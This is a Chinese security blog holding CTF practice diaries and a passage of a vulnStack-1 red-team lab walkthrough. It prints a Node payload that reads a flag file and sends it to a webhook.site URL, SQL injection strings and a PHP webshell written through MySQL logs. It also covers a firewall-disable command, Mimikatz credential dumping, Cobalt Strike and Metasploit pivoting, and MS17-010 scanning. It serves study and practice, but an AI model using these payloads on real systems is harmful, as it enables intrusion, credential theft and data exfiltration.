<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VybmFtZSI6ImFkbWluIiwidXNlcl9rZXkiOiIyNmNlYjY4NWY0NmU2ZDIyIiwiYWRtaW4iOnRydWV9.d2ec4eaeee55b446bcd7ce38c4de754f</span><br></pre></td></tr></table></figure>

<p><img src="http://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230503220021522.png" alt="image-20230503220021522"></p>
<h2 id="5-4"><a href="#5-4" class="headerlink" title="5.4"></a>5.4</h2><p>复现下taum中没有看的题</p>
<p>###taum203-migraine</p>
<p>题目给出源码，是一个js的代码审计</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8000</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line">process.<span class="title function_">on</span>(<span class="string">&#x27;uncaughtException&#x27;</span>, <span class="function">(<span class="params">err, origin</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/&quot;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname+<span class="string">&#x27;/static/index.html&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/&quot;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> src = req.<span class="property">body</span>[<span class="string">&#x27;src&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (src.<span class="title function_">match</span>(<span class="regexp">/[A-Za-z0-9]/</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">418</span>).<span class="title function_">end</span>(<span class="string">&#x27;Bad character detected.&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">eval</span>(src);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">418</span>).<span class="title function_">end</span>(<span class="string">&#x27;Error on eval.&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Example app listening on port <span class="subst">$&#123;port&#125;</span>!`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>一个js的代码执行，ban了数字和字母。但是js是可以直接执行jsfuck的，将我们需要的代码转换为jsfuck执行，</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//来自rain师傅的payload，还没用过webhook.site，学到了</span></span><br><span class="line">process.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>).<span class="title function_">request</span>(&#123;<span class="attr">hostname</span>: <span class="string">&#x27;webhook.site&#x27;</span>,<span class="attr">path</span>: <span class="string">&#x27;/6a551568-cf4e-4cb8-a4ec-47b7c5073f9c&#x27;</span>,<span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,<span class="attr">headers</span>: &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<span class="string">&#x27;Content-Length&#x27;</span>: process.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">readFileSync</span>(<span class="string">&#x27;/flag.txt&#x27;</span>).<span class="title function_">toString</span>().<span class="property">length</span>&#125;&#125;).<span class="title function_">write</span>(process.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">readFileSync</span>(<span class="string">&#x27;/flag.txt&#x27;</span>).<span class="title function_">toString</span>())</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230504212704166.png" alt="image-20230504212704166"></p>
<p>###TAUM2023-Lost and Forgotten</p>
<p>测了半天，没发现考的啥，看样子还以为是某个cve。看了wp才发现是个sql，做的时候根本没往sql这方面想</p>
<p>测试出来不能用<code>order by 6</code>,会报502，只能挨个测试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t&#x27; union select table_name,2,3,4,5,6 from information_schema.tables#  //这里能查到很多表名，根据提示wp在文章中，所以去articles中找</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t&#x27; union select column_name,2,3,4,5,6 from information_schema.columns where table_name =&#x27;articles&#x27;#</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230504221548279.png" alt="image-20230504221548279"></p>
<p>不知道flag在哪一个，就都查了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query=t&#x27; union select access_code,artloc,imgloc,descr,postdate,title from articles#</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230504221814886.png" alt="image-20230504221814886"></p>
<h2 id="5-5"><a href="#5-5" class="headerlink" title="5.5"></a>5.5</h2><p>今天事比较多，就搞了一题，buu随便找的，签到题，练练手吧，不能断！！！</p>
<p>###[WUSTCTF2020]CV Maker</p>
<p>注册登录进去后是一个比较显眼的上传点</p>
<p>测试上传1.php，</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230505234314986.png" alt="image-20230505234314986"></p>
<p>该函数会检测文件类型，加文件幻术头即可绕过</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230505235539473.png" alt="image-20230505235539473"></p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230505235710317.png" alt="image-20230505235710317"></p>
<h2 id="5-6"><a href="#5-6" class="headerlink" title="5.6"></a>5.6</h2><p>d3没打，来复现d3中的题目</p>
<h3 id="d3cloud"><a href="#d3cloud" class="headerlink" title="d3cloud"></a>d3cloud</h3><p>admin/admin进入后台。</p>
<p>存在<code>laravel-admin-extensions/media-manager</code>插件，改插件中</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230506142737944.png" alt="image-20230506142737944"></p>
<p>发下存在插件</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230506151241657.png" alt="image-20230506151241657"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">putFileAs</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$file</span>, <span class="variable">$name</span>, <span class="variable">$options</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$supported_file</span> = <span class="keyword">array</span>(<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;ico&#x27;</span>,<span class="string">&#x27;zip&#x27;</span>,<span class="string">&#x27;mp4&#x27;</span>,<span class="string">&#x27;mp3&#x27;</span>,<span class="string">&#x27;mkv&#x27;</span>,<span class="string">&#x27;avi&#x27;</span>,<span class="string">&#x27;txt&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_type</span>= <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$name</span>,PATHINFO_EXTENSION));</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_type</span>, <span class="variable">$supported_file</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$stream</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getRealPath</span>(), <span class="string">&#x27;r+&#x27;</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">put</span>(</span><br><span class="line">            <span class="variable">$path</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$path</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$name</span>, <span class="string">&#x27;/&#x27;</span>), <span class="variable">$stream</span>, <span class="variable">$options</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_resource</span>(<span class="variable">$stream</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$stream</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getClientOriginalExtension</span>() === <span class="string">&quot;zip&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$fs</span> = <span class="title function_ invoke__">popen</span>(<span class="string">&quot;unzip -oq &quot;</span>. <span class="variable">$this</span>-&gt;driver-&gt;<span class="title function_ invoke__">getAdapter</span>()-&gt;<span class="title function_ invoke__">getPathPrefix</span>() . <span class="variable">$name</span> .<span class="string">&quot; -d &quot;</span> . <span class="variable">$this</span>-&gt;driver-&gt;<span class="title function_ invoke__">getAdapter</span>()-&gt;<span class="title function_ invoke__">getPathPrefix</span>(),<span class="string">&quot;w&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">pclose</span>(<span class="variable">$fs</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span> ? <span class="variable">$path</span> : <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>其中popen这存在命令注入，将文件名拼接再执行的命令里，可以通过闭合拼接的方式来进行注入，从而执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$fs = popen(&quot;unzip -oq &quot;. $this-&gt;driver-&gt;getAdapter()-&gt;getPathPrefix() . $name .&quot; -d &quot; . $this-&gt;driver-&gt;getAdapter()-&gt;getPathPrefix(),&quot;w&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230507013901322.png" alt="image-20230507013901322"></p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230506155203552.png" alt="image-20230506155203552"></p>
<p>###ISCC实战题 </p>
<p>没结束就不放出来了</p>
<h3 id="实习二面笔试题"><a href="#实习二面笔试题" class="headerlink" title="实习二面笔试题"></a>实习二面笔试题</h3><p>这里也不方便放出，目前拿到root权限，明早继续，冲内网</p>
<h2 id="5-7"><a href="#5-7" class="headerlink" title="5.7"></a>5.7</h2><p>继续笔试题，暂时不放出wp</p>
<ul>
<li><p>继昨天的环境，内网存在两台机器，msf上线内网信息收集的时候出了问题，搞了好久</p>
</li>
<li><p>beescms，存在历史漏洞，但是没弱口令，要通过sql注入修改管理员密码</p>
</li>
</ul>
<p>。。。。。</p>
<p>后面遇到很多事情，自己还有许多东西要搞，没时间每天抽时间刷题（主要是不想刷水题，难题又很花时间），就取消了这个这个刷题计划。后续ctf方面就参加每次的比赛来练习一下</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/05/03/2023-5-3-6-1%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0/" data-id="clh7s0fyc0000pkuq90sa0jbv" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-渗透取经-vulStack1" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2023/04/25/%E6%B8%97%E9%80%8F%E5%8F%96%E7%BB%8F-vulStack1/" class="article-date">
  <time datetime="2023-04-25T14:24:49.000Z" itemprop="datePublished">2023-04-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2023/04/25/%E6%B8%97%E9%80%8F%E5%8F%96%E7%BB%8F-vulStack1/">渗透取经-vulStack1</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="vulnStack-1"><a href="#vulnStack-1" class="headerlink" title="vulnStack-1"></a>vulnStack-1</h1><hr>
<p>前言：学学渗透，春秋云镜太贵辣，尝试下红日靶场，还没有打穿。。。。。</p>
<h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>官网下载虚拟机环境：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p>
<p>靶场搭建过程参考：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/118353886">https://blog.csdn.net/weixin_39190897/article/details/118353886</a></p>
<p>该靶场的网络拓扑图：</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230423151951976.png" alt="image-20230423151951976"></p>
<h3 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h3><p>1，win7无法开启phpstudy，重启试过也不行</p>
<p>解决方法，手动开启apache和mysql</p>
<ul>
<li>开启apache</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">进入C:\phpStudy\Apache\bin</span><br><span class="line"></span><br><span class="line">执行这两条命令</span><br><span class="line">httpd.exe -k install</span><br><span class="line">httpd.exe -k -n apache2.4</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230423154128652.png" alt="image-20230423154128652"></p>
<ul>
<li>开启mysql</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">进入：</span><br><span class="line">C:\phpStudy\MySQL\bin</span><br><span class="line">执行：</span><br><span class="line">mysqld --defaults-file=&quot;C:/phpStudy/mysql/my.ini&quot; --console --skip-grant-tables</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230423154349718.png" alt="image-20230423154349718"></p>
<p>2，网络设置，攻击机需要与靶机在同一个网段，攻击机还要设置网关（我的win11就是因为没有设置网关而出问题，卡了半天）</p>
<p>访问web服务，成功搭建开始渗透：</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230423164145971.png" alt="image-20230423164145971"></p>
<h2 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h2><p>访问服务，是一个phpStudy 探针，可以测试链接mysql,账号密码是<code>root</code>，<code>root</code>。但是并没有什么卵用，dirsearch扫一下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230423165152413.png" alt="image-20230423165152413"></p>
<p>弱口令，root,root进入phpMyadmin 【<a target="_blank" rel="noopener" href="https://www.cnblogs.com/liliyuanshangcao/p/13815242.html#_label1_0%E3%80%91">https://www.cnblogs.com/liliyuanshangcao/p/13815242.html#_label1_0】</a></p>
<p>利用phpMyadmin存在的漏洞来getShell：</p>
<p>尝试利用<code>into outfile</code>写入木马，该方法需要满下列条件：</p>
<ul>
<li>当前的数据库用户有写权限</li>
<li>知道web绝对路径</li>
<li>web路径能写</li>
</ul>
<p><code>SELECT @ @basedir </code>查看路径</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230423170835203.png" alt="image-20230423170835203"></p>
<p>执行`show variables like ‘%secure%’;</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230423170520610.png" alt="image-20230423170520610"></p>
<p>当<code>secure_file_priv</code>为NULL时，表示限制Mysql不允许导入导出，要想使得写入文件语句导出成功，则需要在Mysql文件夹下修改<code>my.ini</code> 文件，在[mysqld]内加入<code>secure_file_priv =&quot;&quot;</code> 即可，但是在phpMyadmin中无法修改<code>my.ini</code>文件，换！</p>
<p>通过写入日志文件getshell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set global general_log = &quot;ON&quot;;</span><br><span class="line">show variables like &#x27;general%&#x27;;</span><br><span class="line">set global general_log_file = &quot;C://phpStudy//WWW//shell.php&quot;;  //分隔符要使用，否则无法写入</span><br><span class="line">select &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot;;</span><br></pre></td></tr></table></figure>

<p>这个给靶场还存在<code>ycxcms</code>也能getshell</p>
<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="cs上线"><a href="#cs上线" class="headerlink" title="cs上线"></a>cs上线</h3><p>1，生成cs木马，蚁剑上传</p>
<p>先关闭防火墙</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>

<p>再执行木马程序：</p>
<p>稍等一会可以看到已经上线</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424010441617.png" alt="image-20230424010441617"></p>
<p>拿到 <code>shell</code> 第一步，调低心跳值，默认心跳为 <code>60s</code>，执行命令的响应很慢，进入 <code>beacon</code> 执行 <code>sleep 5</code> 或者右键主机选择 <code>会话→Sleep</code>进行设置</p>
<p>2，信息收集：</p>
<ul>
<li>网络信息</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell ipconfig</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424011201489.png" alt="image-20230424011201489"></p>
<ul>
<li>Minikatz抓本机用户密码，成功获取为<code>Qwer1234</code></li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424011508402.png" alt="image-20230424011508402"></p>
<ul>
<li>提权，利用 MS14-058 成功提权到 SYSTEM 系统权限账户。（看wp说的用这个洞来提权，但是我靶场搭建起来就是<code>SYSTEM</code>权限诶。先不管跟着打一遍）</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424011713237.png" alt="image-20230424011713237"></p>
<p>###域环境信息收集</p>
<p>内网信息收集的主要目的就是查找域控以及域内的其他主机，</p>
<p>部分内网信息收集的命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">net view                 # 查看局域网内其他主机名</span><br><span class="line">net config Workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span><br><span class="line">net user                 # 查看本机用户列表</span><br><span class="line">net user /domain         # 查看域用户</span><br><span class="line">net localgroup administrators # 查看本地管理员组（通常会有域用户）</span><br><span class="line">net view /domain         # 查看有几个域</span><br><span class="line">net user 用户名 /domain   # 获取指定域用户的信息</span><br><span class="line">net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</span><br><span class="line">net group 组名 /domain    # 查看域中某工作组</span><br><span class="line">net group &quot;domain admins&quot; /domain  # 查看域管理员的名字</span><br><span class="line">net group &quot;domain computers&quot; /domain  # 查看域中的其他主机名</span><br><span class="line">net group &quot;doamin controllers&quot; /domain  # 查看域控制器主机名（可能有多台）</span><br></pre></td></tr></table></figure>

<p>1，先判断是否存在域，使用 <code>ipconfig /all</code> 查看 DNS 服务器，发现主 DNS 后缀不为空，存在域<code>god.org</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424194224649.png" alt="image-20230424194224649"></p>
<p>2,查看有几个域（域环境可能存在多个域）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain</span><br></pre></td></tr></table></figure>

<p>发现只有一个域<code>GOD</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424195406949.png" alt="image-20230424195406949"></p>
<p>3，查看域控</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain controllers&quot; /domain</span><br></pre></td></tr></table></figure>

<p>直接确认域控主机的名称为 OWA</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424195340228.png" alt="image-20230424195340228"></p>
<p>4,查看局域网内其他主机信息(主机名称、IP地址)</p>
<p>注：用cs中的net view可以直接查看到ip</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424201421970.png" alt="image-20230424201421970"></p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424202118757.png" alt="image-20230424202118757"></p>
<p>执行命令<code>net group &quot;domain computers&quot; /domain</code> 查看域中的其他主机名</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424201825436.png" alt="image-20230424201825436"></p>
<p>内网信息收集完毕：</p>
<ul>
<li>域控：192.168.52.138  OWA</li>
<li>域成员：192.168.52.141（ROOT-TVI862UBEH），192.168.52.143  （STU1已经控制的机器）</li>
</ul>
<p>注：扫描存活机器的时候还可以利用msf中的模块来探测</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">探测主机存活</span><br><span class="line">use post/windows/gather/arp_scanner</span><br><span class="line">set SESSION 1</span><br><span class="line">set RHOSTS 192.168.52.1-255</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h2 id="内网横向渗透"><a href="#内网横向渗透" class="headerlink" title="内网横向渗透"></a>内网横向渗透</h2><p> 以win7为调板机，横向渗透拿下域内成员及其域控</p>
<p>###CS派生会话给公网MSF</p>
<p>启动msf，开启监听</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set lhost 192.168.14.128</span><br><span class="line">set lport 7777</span><br><span class="line">exploit </span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424212955014.png" alt="image-20230424212955014"></p>
<p>CS开启监听：</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424213157701.png" alt="image-20230424213157701"></p>
<p>CS中添加会话，选择刚刚添加的监听器，转到msf这边可以看到已近收到了</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424213430796.png" alt="image-20230424213430796"></p>
<p>msf功能强大，才学也不知可以干些什么。这里跟着师傅们的操作学学：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/checkvm   #判断是否是虚拟机(检测是否进入了蜜罐)</span><br><span class="line">run post/windows/gather/enum_applications #枚举出靶机上的应用程序</span><br><span class="line">run post/multi/manage/autoroute  #加载MSF的autoroute模块，获取当前机器的所有网段信息</span><br><span class="line">run post/multi/manage/autoroute SUBNET=192.168.52.0 ACTION=ADD #添加目标内网路由</span><br></pre></td></tr></table></figure>

<p>可以看到已经检测出是虚拟机了</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424214119508.png" alt="image-20230424214119508"></p>
<p>###永恒之蓝攻击</p>
<p>利于msf是为了借助他的攻击模块，展开横向渗透，拿下域中其他机器。</p>
<p>####<strong>静态路由配置</strong></p>
<p>MSF 的 autoroute 模块是 MSF 框架中自带的一个路由转发功能，实现过程是 MSF 框架在已经获取的 Meterpreter Shell 的基础上添加一条去往“内网”的路由，直接使用 MSF 去访问原本不能直接访问的内网资源，只要路由可达我们既可使用 MSF 来进行探测了。</p>
<p>1，查看靶机网段信息</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424215141499.png" alt="image-20230424215141499"></p>
<p>2，添加目标内网路由</p>
<p>####<strong>MSF内网端口扫描</strong></p>
<p>现在路由可达内网网段，可以先对内网主机进行探测。</p>
<p>1，使用<code>auxiliary/scanner/portscan/tcp</code>模块对<code>192.168.52.141</code>和<code>192.168.52.138</code>开放的端口进行扫描（这里要先推出当前模块，使用<code>background</code>命令，获取如果要返回使用<code>sessions -i</code>即可）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#msf自带模块</span><br><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line">set rhosts 192.168.52.141</span><br><span class="line">set ports 80,135-139,445,3306,3389</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">#nmap，msf结合了nmap，可以直接里哟nmap来扫描</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424220641489.png" alt="image-20230424220641489"></p>
<p>####<strong>使用<code>ms17-010</code>进行攻击</strong></p>
<p>1，使用MSF 自带的漏洞扫描模块进行扫描：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search ms17_010 #搜索MSF集成的与ms17_010漏洞相关的模块</span><br><span class="line">use auxiliary/scanner/smb/smb_ms17_010 # 加载扫描exp</span><br><span class="line">set rhosts 192.168.52.141 #设置被扫描的主机IP</span><br><span class="line">run  #进行扫描，观察是否存在该漏洞</span><br></pre></td></tr></table></figure>

<p>这发现都存在永恒之蓝漏洞</p>
